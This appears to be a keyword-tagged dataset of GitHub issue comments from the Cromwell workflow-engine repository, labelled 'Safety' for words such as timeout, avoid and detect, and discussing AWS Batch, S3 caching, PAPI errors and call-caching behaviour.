Safety,"Hi @mr-c -> I believe this is because we pin our cwl checkout (as we use `schema-salad`) to a known commit to avoid instability from changing conformance tests and at some point it looks like the tests there require a newer version of `schema-salad` - let me know if you're interpreting this differently (I'm not an expert on things `pip`):. ```; pkg_resources.ContextualVersionConflict: (schema-salad 2.7.20180501211602 (/var/lib/jenkins/workspace/cromwell/venv/lib/python2.7/site-packages), Requirement.parse('schema-salad<3,>=2.7.20180719125426'), set(['cwltool'])); ```. If we can be guaranteed that new tests will **always** be append-only we could remove that pin which should make problems like this go away going forward. FWIW we treat [our travis](https://travis-ci.org/broadinstitute/cromwell/jobs/412681578) as our canonical check (which of course is different from **your** canonical check).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3973#issuecomment-410804918:110,avoid,avoid,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3973#issuecomment-410804918,1,['avoid'],['avoid']
Safety,"Hi Jon,. This isn't directly supported right now. You could change the; CloudFormation template so that your customized mount is mounted to the EC2; nodes. It is also possible to mount EFS directly into an AWS Batch; container through the job definition but that would require changes in; Cromwell's AWS Batch backend. Using EFS with containers for Cromwell; workflows is something we are investigating but there are some stress tests; that we need to do at scale to see if sufficient IOPs are available. On Wed, May 5, 2021 at 11:29 AM microbioticajon ***@***.***>; wrote:. > Hi Guys,; >; > This is more of a question/request than a bug report. Apologies if this is; > not the place to ask.; >; > Im trying to run Cromwell with an AWS backend. A number of our workflows; > make extensive use of very large reference files. To avoid localising the; > same huge file over and over (wasting time and space) I want to copy these; > reference files to an additional volume during batch node initialisation; > and mount to each container (rather than using File arguments I would use a; > simple String argument to prevent localisation - I appreciate this is a; > hack). I am already doing this with a different pipeline framework with; > some success, however it requires the JobDefinition to specify the mount; > locations between the node(host) and job container; >; > Is it possible to provide additional mount/volume instructions to the aws; > batch backend in the cromwell.conf?; >; > If this is possible, I cannot see any specific examples in the Cromwell; > docs. If this is not currently possible, could I request adding the ability; > to define additional mount points as a feature request??; >; > Kind Regards,; > Jon; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6334>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EI7XBOPHMWSYW3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484:827,avoid,avoid,827,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484,2,['avoid'],['avoid']
Safety,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:263,detect,detects,263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165,1,['detect'],['detects']
Safety,"Hi Sean,. Yeah I noticed that, and glad that it is in the process of getting fixed. Though this is precisely why we must have more control over the whole process, as creation of instances are basically just a cascade of events which get tied to an [**Operation**](https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/index.html?com/google/api/services/compute/model/Operation.html), through which you can interface with the VMs that are building or running. I have fairly high confidence that this is basically what is happening underneath the Google service endpoint when performing a [**RunPipelineRequest**](https://github.com/googleapis/googleapis/blob/c4899b3f0cef2caa73bb1a32baf00f54c8a49921/google/genomics/v1alpha2/pipelines.proto#L51-L53) through the [Pipeline API here](https://github.com/googleapis/googleapis/blob/c4899b3f0cef2caa73bb1a32baf00f54c8a49921/google/genomics/v1alpha2/pipelines.proto#L51-L53):. ```; rpc RunPipeline(RunPipelineRequest) returns (google.longrunning.Operation) {; option (google.api.http) = { post: ""/v1alpha2/pipelines:run"" body: ""*"" };; }; ```. If you think of this as a graph of best-effort networked dependent triggers via APIs, you can stabilize this to make it more predictable and scalable. It is just too obvious that we can collectively definitely make this better at this stage - as we already have the tools - and especially since we'll soon have nested workflows via https://github.com/broadinstitute/cromwell/issues/1532, which should be assumed to make the current number of operations in flight grow by several orders of magnitude. ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260533994:1248,predict,predictable,1248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260533994,1,['predict'],['predictable']
Safety,"Hi, thanks for the reply. I was using `version development` which I had assumed meant it had at least the 1.1 features (including `None`). I agree using some safety checks and `select_first` can work, but often using the above paradigm with `None` can be a lot clearer/easier to work with in code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1858364933:158,safe,safety,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1858364933,2,['safe'],['safety']
Safety,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:557,timeout,timeout,557,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310,2,"['Timeout', 'timeout']","['TimeoutException', 'timeout']"
Safety,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:397,timeout,timeout,397,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,2,['timeout'],['timeout']
Safety,"Hmm, that's interesting on the google side. So I'm clear you're saying that Cromwell is showing Running when they were not in Google? If so, how long did that stay the case - was it in perpetuity? I ask because as the number of jobs increases the average latency between a state change on Google's side and Cromwell detecting it increases due to QPS limitations. We're always trying to work with them to find ways to make that faster but we're limited on how many things we can query about at once, so we round robin them through. As an example the other day I submitted 200k single call workflows which each only slept for a couple of seconds but it took upwards of an hour for Cromwell to know that everything was complete due to that. I'm still going to look into the root cause of the exceptions you saw, i've been seeing those a lot myself (but had reason to believe it was an artifact of my not-at-all-standard setup, glad you chimed in to fix that for me) and wanted to make sure they weren't masking something more fundamentally wrong. re the logging aspect, I agree completely - this has always been an issue and is growing the more the people start adopting Cromwell. I found it amusing that just hours prior I said I should change that one to be less frightening and then it frightened someone ;) In general I think that logging is always a a dark art but answering the ""who is the log for?"" is even harder here as we intentionally designed cromwell to satisfy multiple use cases all of whom have different things they want to see. It's something that we're looking to work on over the next several months.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260127711:316,detect,detecting,316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260127711,2,['detect'],['detecting']
Safety,"Hmm, this still makes me very uncomfortable - if the PR is from your develop to develop, you shouldn't have those extra commits. You should not have merged master into your develop. To fix this, you can either start clean from a develop (not merged with master) or if you've tried that and had trouble, I'll offer to help you and open a separate PR. It's messy merges like this with force pushes that lead to a lot of headaches, and it should be avoided if possible. It's important to do this right. It's after 11pm here and I'm not in work mode, but I can help with this tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464973494:446,avoid,avoided,446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464973494,1,['avoid'],['avoided']
Safety,Hmm… Liquibase isn't thread safe. https://liquibase.jira.com/browse/CORE-2792. The various tests creating temporary databases may need refactoring.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-436756869:28,safe,safe,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-436756869,1,['safe'],['safe']
Safety,"How ""eventually"" consistent should I be thinking on metadata, etc.? Seconds, minutes, hours, longer? The timeout at batch submission is likely a client-side thing, so we can probably ignore that issue for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1794#issuecomment-267638887:105,timeout,timeout,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1794#issuecomment-267638887,1,['timeout'],['timeout']
Safety,"I agree that an upfront sanity check would be nice, should I do it as part of this ticket ? It seems like a new feature to me as it's not in JES either but I don't mind really.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151868823:24,sanity check,sanity check,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151868823,1,['sanity check'],['sanity check']
Safety,"I agree we should talk about it - although in order to enable sub-workflows, I personally think it's a good thing as it will avoid confusion (both on user and cromwell side) on what is being called.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-253887045:125,avoid,avoid,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-253887045,1,['avoid'],['avoid']
Safety,"I also played around with bolting on the docker hashing too. To be clear, I like @mcovarr's PR here better, as it's much cleaner, and has tests! Still, here's some overlapping [code](https://github.com/broadinstitute/cromwell/compare/job_avoidance...ks_hash_docker_image) to look at, especially the first commit with an alternative way to get an `ActorSystem` down into the `BackendCall`. A few issues left though, but some/most of these can be logged as new tickets, and we can get basic wiring in for the moment via this PR. Biggest issue-- 10 seconds is right on the edge for testing _and_ checking the docker server for the hash, so different docker tests currently timeout intermittently. Among other issues I saw, `Future` exception handling may be different due to refactoring. For example converting `Future { /* big block */ }` to `/* big block */ hashFuture.map(hash => ...)` allows exceptions within the block to not get caught (as expected?). Also I wasn't sure yet how we want to handle some `Failure` cases, specifically when the docker server doesn't return a hash. I assume that means that we should just run again from scratch, and NOT go to a `FailedExecution` state in the database. Or maybe we should go to `Failure`, and just retry a particular operations later. With ~~Gatling~~ Tyburn load testing, perhaps we can log any docker client errors now, and start to distinguish them with custom error handling code as they pop up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702:670,timeout,timeout,670,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702,2,['timeout'],['timeout']
Safety,"I also saw this problem. The VM is not a preemptible and I'm using Cromwell v32. There's a lot of shards spending 10 minutes in ""Waiting for quota"" when this problem happens. The instance that gives PAPI Error Code 10 was able to get a virtual machine, though. Maybe there is a timeout for ""Waiting for quota"" which causes all other shards to fail with Error Code 10 even though there was nothing wrong with this particular shard?. ```; Task to_bam_workflow.BaseRecalibrator:3:1 failed. The job was stopped before the command finished. PAPI error code 10. Message: 14: VM ggp-8822042418103915125 stopped unexpectedly.; java.lang.Exception: Task to_bam_workflow.BaseRecalibrator:3:1 failed. The job was stopped before the command finished. PAPI error code 10. Message: 14: VM ggp-8822042418103915125 stopped unexpectedly.; 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:73); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:520); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:527); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:77); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1019); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1015); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.Batching",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985:278,timeout,timeout,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985,1,['timeout'],['timeout']
Safety,I am working on code in the branch `issue\5004` that will remove the need for the proxy container and might make this redundant. It would be good to discuss and see if there is a way to kill two birds with one stone.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-626967088:118,redund,redundant,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-626967088,1,['redund'],['redundant']
Safety,"I asked your question to PAPI and here is the response:. > This detail is not something that should be counted on in a containerized environment.; That said: the /dev/disk/by-id/* system is simply a convenient alias. The underlying block storage doesn't change (eg, /dev/disk/by-id/google-local-disk is a symlink to a block device, in this case, /dev/sdb). So they should be able to continue monitoring if they want, it will just be harder to recover the mapping.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4388#issuecomment-439092230:443,recover,recover,443,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4388#issuecomment-439092230,2,['recover'],['recover']
Safety,I backed out the name-mangling change because it was redundant in fixing the actual bug and had far-reaching consequences.; - The upgrade script was very broken because it makes extensive use of anonymous node names to come up with real names for what to put in the WDL; - String concatenation and string comparison feel like gross tools to use when we have types at our disposal... i.e. evaluating `.isInstanceOf[AnonymousExpressionNode]`. I can imagine a future where we have a `canLinkWith` function that evaluates name and type to return a boolean,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4075#issuecomment-420680044:53,redund,redundant,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4075#issuecomment-420680044,1,['redund'],['redundant']
Safety,"I believe that this was a case of `abort-jobs-on-terminate` not being set. The default has changed in #1664, so one shouldn't have to opt in to this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1645#issuecomment-259756546:35,abort,abort-jobs-on-terminate,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1645#issuecomment-259756546,1,['abort'],['abort-jobs-on-terminate']
Safety,"I can't think of any runtime parameters (with the exception of `docker`); that should change the hashing. Also, are the inputs to the task hashed or; is it the fully rendered command block or what? Because if I have a; parameter to the task (such as ""preemptible_attempts"") that is only used in; the runtime block, (ideally) I'd like it to be ignored for call caching; purposes. On Fri, Sep 8, 2017 at 3:12 PM, Kate Voss <notifications@github.com> wrote:. > As a *workflow runner*, I want *certain parameters to be ignored in the; > hashing process*, so that I can *call cache on more workflows when the; > result is exactly the same*.; >; > - Effort: *?*; > - Risk: *Medium*; > - We should err on the side of hashing a workflow differently if we; > are not absolutely confident that the parameter does not impact the result.; > - Which parameters are ignored is NOT user-editable. This is to; > prevent users from accidentally ignoring parameters that do impact the; > result.; > - Business value: *Medium*; >; > Some parameters, such as preemptible_attempts and CPU, don't affect the; > outcome of the workflow but workflows with different CPU values will not; > call cache.; >; > @LeeTL1220 <https://github.com/leetl1220> and @geoffjentry; > <https://github.com/geoffjentry> to provide additional thoughts and; > context if helpful.; > Related issue #1210; > <https://github.com/broadinstitute/cromwell/issues/1210>; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2604>, or mute the; > thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk24fM_SrXs0gx-Ry1aw1opHFZAb5ks5sgZG5gaJpZM4PRlLU>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717:661,Risk,Risk,661,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717,1,['Risk'],['Risk']
Safety,"I concur-- more comments in general to avoid people ""fixing"" anything you've profiled here. After that 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1468/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1468#issuecomment-248757551:39,avoid,avoid,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1468#issuecomment-248757551,1,['avoid'],['avoid']
Safety,"I don't actually know what the fix is because I don't know the intent behind exporting custom `TMPDIR` into the shell environment. I could just delete that line — it seems redundant to me, I can't think why the command shell `TMPDIR` has to equal `java.io.tmpdir` — but I don't know if it's there to fix some other issue that I don't know about.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2035#issuecomment-282901047:172,redund,redundant,172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2035#issuecomment-282901047,1,['redund'],['redundant']
Safety,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1085,unsafe,unsafeToFuture,1085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690,3,"['timeout', 'unsafe']","['timeout', 'unsafeToFuture']"
Safety,I don't think these issues block anybody - they just lead to constant questions and give a bad impression of our reliability. People are often worried they are still spending money because it looks that way. I could do a query to probably find how often aborts don't work if that helps. . There isn't a workaround to either issue - only that we tell users it's ok after we dig in to find out that it is and they just deal with the inconsistency.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334480164:254,abort,aborts,254,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334480164,1,['abort'],['aborts']
Safety,"I find that it's always worth looking those up in any language you're not using regularly, because they're not used consistently from one to the other. And including a sanity check/test in whatever code you write, to make sure it's returning what you expect :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1604#issuecomment-270675432:168,sanity check,sanity check,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1604#issuecomment-270675432,1,['sanity check'],['sanity check']
Safety,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:208,safe,safe,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027,1,['safe'],['safe']
Safety,I have just had a run with Cromwell 55 configured with the `cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory` Google API and which resulted in several `504 Gateway Timeout` errors while attempting to read `rc` and `stdout` output files. Is this something that should be looked into?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760291957:190,Timeout,Timeout,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760291957,1,['Timeout'],['Timeout']
Safety,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:687,detect,detects,687,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702,1,['detect'],['detects']
Safety,"I just mentioned this in another issue @TMiguelT and I know it doesn't help your immediate problem but I'd personally recommend avoiding docker containers which use `ENTRYPOINT` for reproducible workflows. . For instance, `ENTRYPOINT` is slated to be [permanently overridden in CWL 2.0](https://github.com/common-workflow-language/common-workflow-language/issues/522), and it's clear that both WDL and CWL were designed without `ENTRYPOINT` in mind.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4381#issuecomment-438110931:128,avoid,avoiding,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4381#issuecomment-438110931,2,['avoid'],['avoiding']
Safety,I just merged https://github.com/broadinstitute/cromwell/pull/7179 so I think this PR has become redundant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1644504893:97,redund,redundant,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1644504893,1,['redund'],['redundant']
Safety,"I like the idea of a centralized rate limiter (proxy, supervisor, whatever) to more rationally avoid QPS issues, but these changes are more generally making the vassals robust to any sort of transient problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153442613:95,avoid,avoid,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153442613,1,['avoid'],['avoid']
Safety,"I made some comments regarding concurrency & thread safety. Those weren't a roundabout way of me saying I thought there _was_ a problem, rather I just wanted to make sure that was thought through due to the way that's being called. 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1273/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1273#issuecomment-238712758:52,safe,safety,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1273#issuecomment-238712758,1,['safe'],['safety']
